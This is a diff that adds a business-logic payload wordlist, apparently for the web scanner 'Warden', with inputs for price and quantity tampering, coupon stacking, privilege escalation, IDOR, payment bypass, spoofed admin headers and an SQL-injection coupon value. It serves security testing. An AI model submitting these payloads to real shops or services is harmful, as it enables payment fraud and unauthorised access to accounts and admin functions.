@@ -1,0 +1,358 @@
+# Business Logic Vulnerability Payloads
+# Warden v0.8.0 Enterprise Edition
+# Testing for: Price manipulation, coupon abuse, privilege escalation, payment bypass, cart manipulation
+
+# ============================================================================
+# PRICE MANIPULATION
+# ============================================================================
+
+# Negative prices
+-100.00
+-50
+-0.01
+-9999.99
+price=-100
+price=-1
+amount=-50
+total=-100
+
+# Zero/Free
+price=0
+price=0.00
+amount=0
+total=0
+price=free
+cost=free
+payment=free
+
+# Fractional/Scientific notation
+price=0.001
+price=1e-5
+price=1e-10
+price=0.0001
+amount=0.01
+
+# Overflow
+price=999999999.99
+price=1e10
+amount=999999999
+total=999999999999
+
+# String/Type manipulation
+price=free
+price=null
+price=undefined
+price=[]
+price={"price":0}
+price=<script>0</script>
+price=1.2.3
+price=$100
+price=100USD
+
+# Currency manipulation
+currency=USD
+currency=XXX
+currency=JPY
+amount=1&currency=JPY
+pay_currency=USD&price_currency=JPY
+
+# ============================================================================
+# COUPON ABUSE
+# ============================================================================
+
+# Double/triple stacking
+coupon=SAVE10&coupon=SAVE20
+coupon=FREE&coupon=SAVE10
+coupons[]=SAVE10&coupons[]=SAVE20
+coupons=SAVE10,SAVE20,FREE
+discount=50&discount=50
+promo=FREE10&promo2=SAVE20
+
+# Negative/Overflow discounts
+discount=-50
+discount=-100
+discount=150
+discount=999
+discount_percent=200
+
+# Expired/Invalid coupons
+coupon=EXPIRED2020
+coupon=HACKED2024
+coupon=NULL
+coupon=' OR '1'='1
+coupon=admin
+
+# Coupon bypasses
+skip_coupon=true
+no_coupon=true
+free_shipping=true
+discount_applied=true
+
+# ============================================================================
+# PRIVILEGE ESCALATION
+# ============================================================================
+
+# Role manipulation
+role=admin
+role=superuser
+role=root
+role=administrator
+user_type=admin
+access_level=99
+permission_level=admin
+is_admin=true
+is_superuser=1
+is_admin=1
+admin=true
+superuser=true
+
+# Permission bypass
+bypass=true
+skip_auth=true
+no_auth=true
+auth=false
+authenticated=true
+logged_in=true
+session=valid
+
+# IDOR - sequential IDs
+user_id=1
+user_id=2
+user_id=0
+account_id=1
+profile_id=1
+order_id=1
+invoice_id=1
+
+# Session manipulation
+session_id=admin_session
+session_id=1
+token=admin
+user=admin&password=admin
+
+# Direct object access
+/admin
+/admin/dashboard
+/admin/users
+/admin/settings
+/wp-admin
+/manager
+/console
+/controlpanel
+
+# ============================================================================
+# PAYMENT BYPASS
+# ============================================================================
+
+# Payment skipping
+payment_required=false
+skip_payment=true
+no_payment=true
+payment=false
+paid=true&total=100
+payment_status=paid
+payment_complete=true
+
+# Free order manipulation
+total=0&paid=true
+amount=0.01&paid_amount=100
+order_total=0
+price=0&checkout=true
+
+# Payment status override
+status=paid
+order_status=completed
+payment_status=verified
+transaction_id=fake_payment
+payment_gateway=test
+
+# Refund abuse
+refund=true
+refund_amount=99999
+chargeback=true
+full_refund=true
+
+# Payment method bypass
+payment_method=free
+payment_type=credit_card&number=fake
+card_number=4111111111111111
+cvv=000
+
+# ============================================================================
+# CART MANIPULATION
+# ============================================================================
+
+# Negative quantities
+quantity=-1
+quantity=-100
+qty=-1
+count=-5
+amount=-10
+
+# Zero quantity
+quantity=0
+quantity=0&price=100
+qty=0&add_to_cart=true
+
+# Overflow quantities
+quantity=999999999
+quantity=999999
+qty=99999
+count=999999999
+
+# Fractional quantities
+quantity=0.5
+quantity=0.1
+qty=1.5
+quantity=-0.5
+
+# Product swap/ID manipulation
+product_id=1&actual_product_id=2
+item_id=1&price=0.01
+sku=PROD1&real_sku=PROD2
+product_id[]=1&product_id[]=2
+
+# Cart after payment
+cart_id=paid_order_123&add_item=1
+order_id=123&update=true
+paid_cart=true&modify=true
+
+# Price override
+price=0.01&product_id=1
+custom_price=1
+override_price=true
+user_price=0.01
+
+# ============================================================================
+# PARAMETER POLLUTION
+# ============================================================================
+
+# Duplicate parameters
+price=100&price=0
+quantity=1&quantity=999
+user_id=2&user_id=1
+coupon=VALID&coupon=FREE
+
+# Array notation
+price[]=100&price[]=0
+quantity[]=1&quantity[]=999
+user_id[]=2&user_id[]=1
+
+# ============================================================================
+# RACE CONDITIONS
+# ============================================================================
+
+# Concurrent operations (requires multiple requests)
+# Use with -thread option for testing
+
+# ============================================================================
+# JSON PAYLOADS FOR API TESTING
+# ============================================================================
+
+{"price": -100.00}
+{"price": 0}
+{"quantity": -1}
+{"role": "admin"}
+{"is_admin": true}
+{"payment_required": false}
+{"paid": true, "total": 100}
+{"coupon": "FREE", "coupon2": "SAVE10"}
+{"user_id": 1}
+{"product_id": 1, "price": 0.01}
+{"quantity": 999999999}
+
+# ============================================================================
+# ENCODING VARIATIONS
+# ============================================================================
+
+# URL encoding
+price=%2D100
+role=%61%64%6D%69%6E
+user%5Fid=1
+
+# Double encoding
+price=%252D100
+role=%2561%2564%256D%2569%256E
+
+# Unicode
+price=\u002d100
+role=\u0061\u0064\u006d\u0069\u006e
+
+# ============================================================================
+# TIME MANIPULATION
+# ============================================================================
+
+# Expired dates
+expiry=2020-01-01
+valid_until=2000-12-31
+coupon_date=2021-01-01
+
+# Future dates
+start_date=2099-01-01
+valid_from=2099-12-31
+
+# ============================================================================
+# HEADERS
+# ============================================================================
+
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Roles: admin
+X-User-Id: 1
+X-Is-Admin: true
+Authorization: Bearer admin_token
+Cookie: session=admin_session; user=admin
+
+# ============================================================================
+# COMMON API ENDPOINTS
+# ============================================================================
+
+/api/cart
+/api/checkout
+/api/order
+/api/payment
+/api/coupon
+/api/user
+/api/profile
+/api/admin
+/cart
+/checkout
+/order
+/payment
+/admin
+
+# ============================================================================
+# ADDITIONAL BUSINESS LOGIC VECTORS
+# ============================================================================
+
+# Gift card manipulation
+gift_card=9999999999999999
+gift_card_balance=99999
+apply_gift_card=true&gift_card=fake
+
+# Store credit abuse
+store_credit=99999
+credit_balance=999999
+use_credit=true&amount=99999
+
+# Loyalty points
+loyalty_points=999999999
+redeem_points=true&points=999999
+
+# Shipping manipulation
+shipping=0
+free_shipping=true
+shipping_cost=-100
+pickup=true&shipping_required=true
+
+# Tax manipulation
+tax=0
+tax_exempt=true
+vat_number=fake_vat
+no_tax=true
+
+# Inventory bypass
+stock_ignore=true
+backorder=true
+inventory_check=false
+reserve=true&stock=false
